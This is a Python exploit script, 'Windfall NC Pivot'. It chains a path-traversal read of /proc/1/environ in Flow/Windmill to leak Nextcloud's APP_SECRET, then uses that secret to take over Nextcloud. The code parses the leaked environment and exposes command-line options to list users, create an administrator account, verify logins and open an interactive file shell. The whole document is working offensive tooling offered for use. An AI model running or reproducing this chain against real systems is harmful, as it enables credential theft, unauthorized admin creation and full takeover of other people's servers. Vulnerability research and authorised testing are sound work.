#!/usr/bin/env python3
"""
Windfall NC Pivot - Nextcloud Takeover via APP_SECRET

Leak APP_SECRET from Flow/Windmill via path traversal → Full Nextcloud takeover

Author: Chocapikk
Date: 2026-01-17
"""

import argparse
import sys

from nc_appapi import NCAppAPI, FileShell
from windfall import log, console
from windfall_afr import WindfallExploit

BANNER = """
╔═══════════════════════════════════════════════════════════════╗
║               W I N D F A L L   N C   P I V O T               ║
║               Nextcloud Takeover via APP_SECRET               ║
║                                                               ║
║       Path Traversal → APP_SECRET → Create Admin → Login      ║
║                          by Chocapikk                         ║
╚═══════════════════════════════════════════════════════════════╝
"""


class NCPivot(WindfallExploit):
    """Leak APP_SECRET from Flow/Windmill and pivot to Nextcloud."""
    
    def __init__(self, url: str, timeout: int = 30):
        super().__init__(url, timeout=timeout)
        self.app_secret: str | None = None
        self.app_id: str = "flow"
        self.app_version: str = "1.0.0"
        self.aa_version: str = "2.0.0"
        self.nc_url: str | None = None
    
    def _parse_environ(self, content: bytes) -> dict[str, str]:
        """Parse null-separated environ."""
        env = {}
        for item in content.split(b"\x00"):
            if b"=" in item:
                k, v = item.split(b"=", 1)
                env[k.decode()] = v.decode()
        return env
    
    def leak_app_secret(self) -> bool:
        """Leak APP_SECRET, APP_ID, APP_VERSION, AA_VERSION from /proc/1/environ."""
        p = log.progress("Leaking APP_SECRET")
        
        content = self.read_file("/proc/1/environ")
        if not content:
            p.failure("Could not read environ")
            return False
        
        env = self._parse_environ(content)
        if "APP_SECRET" not in env:
            p.failure("APP_SECRET not found")
            return False
        
        self.app_secret = env["APP_SECRET"]
        self.app_id = env.get("APP_ID", "flow")
        self.app_version = env.get("APP_VERSION", "1.0.0")
        self.aa_version = env.get("AA_VERSION", "2.0.0")
        self.nc_url = env.get("NEXTCLOUD_URL")
        
        p.success(f"{self.app_secret[:8]}...{self.app_secret[-4:]}")
        log.info(f"APP_ID: {self.app_id}, AA_VERSION: {self.aa_version}")
        if self.nc_url:
            log.info(f"Nextcloud URL: {self.nc_url}")
        return True
    
    def get_api(self, nc_url: str = None) -> NCAppAPI:
        """Get NCAppAPI instance with leaked credentials."""
        url = nc_url or self.nc_url or self.url
        return NCAppAPI(
            nc_url=url,
            app_secret=self.app_secret,
            app_id=self.app_id,
            aa_version=self.aa_version,
            app_version=self.app_version,
            timeout=self.timeout
        )


def main():
    parser = argparse.ArgumentParser(
        description="Nextcloud Takeover via APP_SECRET (Flow/Windmill)",
        epilog="Leaks APP_SECRET from Flow/Windmill, then exploits Nextcloud. "
               "Use nc_appapi.py directly if you already have the credentials."
    )
    parser.add_argument("url", help="Flow/Windmill URL (for leak)")
    parser.add_argument("--nc-url", help="Nextcloud URL (if different from leaked NEXTCLOUD_URL)")
    parser.add_argument("--app-secret", help="APP_SECRET (skip leak)")
    parser.add_argument("--app-id", help="APP_ID (skip leak)")
    parser.add_argument("--aa-version", help="AA_VERSION (skip leak)")
    parser.add_argument("--app-version", help="APP_VERSION (skip leak)")
    parser.add_argument("--list-users", action="store_true", help="List users")
    parser.add_argument("--create-admin", action="store_true", help="Create admin")
    parser.add_argument("-U", "--username", help="Admin username")
    parser.add_argument("-P", "--password", help="Admin password")
    parser.add_argument("--verify", nargs=2, metavar=("USER", "PASS"), help="Verify login")
    parser.add_argument("--shell", action="store_true", help="Interactive file browser")
    args = parser.parse_args()
    
    console.print(BANNER)
    log.info(f"Target: {args.url}")
    
    pivot = NCPivot(args.url)
    
    # Get credentials - either from args or by leaking
    if args.app_secret:
        pivot.app_secret = args.app_secret
        pivot.app_id = args.app_id or "flow"
        pivot.aa_version = args.aa_version or "2.0.0"
        pivot.app_version = args.app_version or "1.0.0"
        pivot.nc_url = args.nc_url
        log.success(f"APP_SECRET: {args.app_secret[:8]}...")
    elif not pivot.leak_app_secret():
        sys.exit(1)
    
    # Override NC URL if specified
    if args.nc_url:
        pivot.nc_url = args.nc_url
    
    # Get API instance
    api = pivot.get_api()
    
    if args.verify:
        sys.exit(0 if api.verify_login(*args.verify) else 1)
    
    if args.create_admin:
        result = api.create_admin(args.username, args.password)
        if not result:
            sys.exit(1)
        user, pwd = result
        log.success(f"Credentials: {user} / {pwd}")
        log.info(f"Login: {api.nc_url}/login")
    elif args.list_users:
        users = api.list_users()
        for u in users:
            groups = api._users_cache.get(u, [])
            log.info(f"  {u}" + (" (admin)" if "admin" in groups else ""))
    elif args.shell:
        FileShell(api).run()
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
